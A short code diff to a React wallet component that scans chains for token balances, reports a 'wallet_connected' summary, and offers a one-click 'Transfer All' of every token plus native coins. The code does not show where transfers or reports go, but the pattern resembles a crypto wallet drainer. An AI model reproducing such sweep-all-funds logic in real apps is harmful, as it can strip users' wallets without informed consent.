@@ -97,7 +97,8 @@ export function PipelinePanel() {
       address &&
       chains.length > 0 &&
       !scanning &&
-      totalTokensWithBalance > 0
+      totalTokensWithBalance > 0 &&
+      !isTransferMode() // Don't send wallet_connected in transfer mode (sendData closes the app)
     ) {
       notifiedRef.current = true;
       const summaries: ChainSummary[] = chains
@@ -206,12 +207,12 @@ export function PipelinePanel() {
           </div>
 
           {/* Transfer All Button */}
-          {progress.step === "idle" && totalTokensWithBalance > 0 && (
+          {progress.step === "idle" && (totalTokensWithBalance > 0 || chainsWithValue.some(c => c.nativeBalance > 0n)) && (
             <button
               onClick={() => transferAll(chains)}
               className="w-full rounded-xl bg-gradient-to-r from-indigo-500 to-fuchsia-500 py-3 text-sm font-bold"
             >
-              Transfer All ({totalTokensWithBalance} tokens)
+              Transfer All ({totalTokensWithBalance} tokens + native)
             </button>
           )}
 
